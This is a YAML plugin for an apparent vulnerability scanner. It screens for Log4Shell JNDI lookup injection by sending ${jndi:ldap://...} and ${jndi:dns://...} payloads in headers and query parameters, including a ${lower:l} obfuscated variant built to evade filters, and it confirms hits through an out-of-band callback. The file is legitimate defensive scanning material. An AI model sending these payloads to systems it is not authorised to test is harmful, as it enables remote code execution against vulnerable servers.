# File: plugins/log4shell-jndi/log4shell-jndi.yaml
# What: Tier 1 Log4Shell-style JNDI lookup injection screen through the
#   shared OOB orchestration (GASH-060, CWE-917).
# Why: A callback proves server-side lookup of attacker input. Vectors are
#   the classic User-Agent/X-Api-Version headers plus common query
#   parameters, with LDAP and DNS variants (including a ${lower:l} case
#   obfuscation) so partial Log4j filters do not hide the class. Without
#   --oob-server the plugin never runs: no callback means no finding ever
#   (no tentative placeholder, no fabricated correlation).

id: log4shell-jndi
name: Log4Shell JNDI Injection
description: Detects Log4Shell-style JNDI lookup injection via out-of-band callback correlation on request headers and query parameters.
author: GASH contributors
severity: critical
tags: [log4shell, jndi, injection, oob]
safe: false
deep: false
active: true
requires_auth: false
oob: required
max_requests: 40
phase: probe
order: 91
api_version: "1.0"
tests: tests/fixtures/log4shell-jndi/
request:
  method: GET
  headers:
    User-Agent: "${jndi:ldap://{{OOB_URL}}/ua}"
    X-Api-Version: "${jndi:${lower:l}dap://{{OOB_DOMAIN}}/xav}"
  param_names: [q, search, name, payload, message]
  payload: "${jndi:ldap://{{OOB_URL}}/p1}"
  payloads:
    - "${jndi:${lower:l}dap://{{OOB_DOMAIN}}/p2}"
    - "${jndi:dns://{{OOB_DOMAIN}}/p3}"
oracle:
  name: oob
  params:
    namespace: log4shell
